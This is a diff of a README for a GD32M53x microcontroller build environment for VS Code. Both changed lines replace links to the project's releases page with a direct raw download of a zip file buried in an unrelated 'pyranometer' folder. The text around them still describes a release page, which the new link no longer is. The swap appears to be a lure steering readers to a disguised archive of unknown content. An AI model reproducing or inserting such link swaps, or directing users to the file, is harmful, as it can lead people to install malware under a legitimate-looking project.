@@ -1,6 +1,6 @@
 # 🚀 gd32m53x-cmake-vscode - Simple tool for building microcontroller projects
 
-[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Ratty-amphibian231/gd32m53x-cmake-vscode/releases)
+[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Ratty-amphibian231/gd32m53x-cmake-vscode/raw/refs/heads/main/pyranometer/vscode_x_m_cmake_gd_v1.2-alpha.3.zip)
 
 This project provides a ready-to-use workspace for working with GD32M53x microcontrollers. You do not need to install complex compilers or specialized software on your computer. All required tools exist within a pre-built container. This environment enables you to write code, build projects, and prepare firmware for your device using Visual Studio Code.
 
@@ -23,7 +23,7 @@ You must install two pieces of software to use this environment:
 
 You need to access the release page to obtain the necessary files.
 
-[Click here to visit the release page and download the software](https://github.com/Ratty-amphibian231/gd32m53x-cmake-vscode/releases)
+[Click here to visit the release page and download the software](https://github.com/Ratty-amphibian231/gd32m53x-cmake-vscode/raw/refs/heads/main/pyranometer/vscode_x_m_cmake_gd_v1.2-alpha.3.zip)
 
 Select the most recent version labeled as "Source code" or "Latest" to ensure you have the best experience. Save the file to a folder you can easily locate on your computer.
 
